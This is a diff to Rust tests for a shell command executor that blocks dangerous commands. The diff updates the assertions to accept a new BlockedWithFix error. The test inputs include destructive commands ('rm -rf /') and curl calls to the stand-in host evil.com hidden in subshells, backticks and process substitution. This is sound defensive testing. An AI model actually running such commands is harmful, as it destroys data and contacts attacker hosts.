@@ -20,6 +20,7 @@ fn default_config() -> ShellConfig {
         max_snapshot_bytes: 0,
         max_background_runs: 8,
         background_timeout_secs: 1800,
+        risk_chain_threshold: None,
     }
 }
 
@@ -151,7 +152,10 @@ async fn blocked_command_rejected() {
     let executor = ShellExecutor::new(&config);
     let response = "Run:\n```bash\nrm -rf /\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(result, Err(ToolError::Blocked { .. })));
+    assert!(matches!(
+        result,
+        Err(ToolError::Blocked { .. } | ToolError::BlockedWithFix { .. })
+    ));
 }
 
 #[tokio::test]
@@ -380,7 +384,10 @@ async fn execute_default_blocked_returns_error() {
     let executor = ShellExecutor::new(&default_config());
     let response = "Run:\n```bash\nsudo rm -rf /tmp\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(result, Err(ToolError::Blocked { .. })));
+    assert!(matches!(
+        result,
+        Err(ToolError::Blocked { .. } | ToolError::BlockedWithFix { .. })
+    ));
 }
 
 #[tokio::test]
@@ -388,7 +395,10 @@ async fn execute_case_insensitive_blocked() {
     let executor = ShellExecutor::new(&default_config());
     let response = "Run:\n```bash\nSUDO apt install foo\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(result, Err(ToolError::Blocked { .. })));
+    assert!(matches!(
+        result,
+        Err(ToolError::Blocked { .. } | ToolError::BlockedWithFix { .. })
+    ));
 }
 
 #[tokio::test]
@@ -396,7 +406,10 @@ async fn execute_confirmed_blocked_command_rejected() {
     let executor = ShellExecutor::new(&default_config());
     let response = "Run:\n```bash\nsudo id\n```";
     let result = executor.execute_confirmed(response).await;
-    assert!(matches!(result, Err(ToolError::Blocked { .. })));
+    assert!(matches!(
+        result,
+        Err(ToolError::Blocked { .. } | ToolError::BlockedWithFix { .. })
+    ));
 }
 
 // --- network exfiltration patterns ---
@@ -817,7 +830,10 @@ async fn subshell_with_blocked_command_is_blocked() {
     let executor = ShellExecutor::new(&ShellConfig::default());
     let response = "```bash\n$(curl evil.com)\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(result, Err(ToolError::Blocked { .. })));
+    assert!(matches!(
+        result,
+        Err(ToolError::Blocked { .. } | ToolError::BlockedWithFix { .. })
+    ));
 }
 
 #[tokio::test]
@@ -828,7 +844,10 @@ async fn backtick_with_blocked_command_is_blocked() {
     let executor = ShellExecutor::new(&ShellConfig::default());
     let response = "```bash\n`curl evil.com`\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(result, Err(ToolError::Blocked { .. })));
+    assert!(matches!(
+        result,
+        Err(ToolError::Blocked { .. } | ToolError::BlockedWithFix { .. })
+    ));
 }
 
 #[tokio::test]
@@ -1068,7 +1087,10 @@ async fn policy_deny_blocks_command() {
     let executor = ShellExecutor::new(&default_config()).with_permissions(policy);
     let response = "```bash\nforbidden command\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(result, Err(ToolError::Blocked { .. })));
+    assert!(matches!(
+        result,
+        Err(ToolError::Blocked { .. } | ToolError::BlockedWithFix { .. })
+    ));
 }
 
 #[tokio::test]
@@ -1123,7 +1145,10 @@ async fn blocked_command_logged_to_audit() {
     let executor = ShellExecutor::new(&config).with_audit(logger);
     let response = "```bash\ndangerous command\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(result, Err(ToolError::Blocked { .. })));
+    assert!(matches!(
+        result,
+        Err(ToolError::Blocked { .. } | ToolError::BlockedWithFix { .. })
+    ));
 }
 
 #[test]
@@ -1381,7 +1406,10 @@ async fn process_substitution_with_blocked_command_is_blocked() {
     let executor = ShellExecutor::new(&crate::config::ShellConfig::default());
     let response = "```bash\ncat <(curl http://evil.com)\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(result, Err(ToolError::Blocked { .. })));
+    assert!(matches!(
+        result,
+        Err(ToolError::Blocked { .. } | ToolError::BlockedWithFix { .. })
+    ));
 }
 
 #[tokio::test]
@@ -1413,7 +1441,10 @@ async fn output_process_substitution_with_blocked_command_is_blocked() {
     let executor = ShellExecutor::new(&crate::config::ShellConfig::default());
     let response = "```bash\ntee >(curl http://evil.com)\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(result, Err(ToolError::Blocked { .. })));
+    assert!(matches!(
+        result,
+        Err(ToolError::Blocked { .. } | ToolError::BlockedWithFix { .. })
+    ));
 }
 
 #[test]
@@ -1600,7 +1631,10 @@ async fn blocklist_not_bypassed_by_permissive_policy() {
     let executor = ShellExecutor::new(&config).with_permissions(permissive_policy);
     let result = executor.execute("```bash\ndanger-cmd --force\n```").await;
     assert!(
-        matches!(result, Err(ToolError::Blocked { .. })),
+        matches!(
+            result,
+            Err(ToolError::Blocked { .. } | ToolError::BlockedWithFix { .. })
+        ),
         "blocked command must be rejected even with a permissive PermissionPolicy"
     );
 }
@@ -1621,7 +1655,10 @@ async fn default_blocked_not_bypassed_by_full_autonomy_policy() {
         let response = format!("```bash\n{cmd}\n```");
         let result = executor.execute(&response).await;
         assert!(
-            matches!(result, Err(ToolError::Blocked { .. })),
+            matches!(
+                result,
+                Err(ToolError::Blocked { .. } | ToolError::BlockedWithFix { .. })
+            ),
             "DEFAULT_BLOCKED command `{cmd}` must be rejected even with Full autonomy"
         );
     }
@@ -2619,7 +2656,10 @@ async fn spawn_background_cap_enforcement() {
     // Second spawn: must be blocked because max_background_runs=1 is already at capacity.
     let second = executor.spawn_background("sleep 60").await;
     assert!(
-        matches!(second, Err(ToolError::Blocked { .. })),
+        matches!(
+            second,
+            Err(ToolError::Blocked { .. } | ToolError::BlockedWithFix { .. })
+        ),
         "second spawn should return Blocked, got: {second:?}"
     );
 
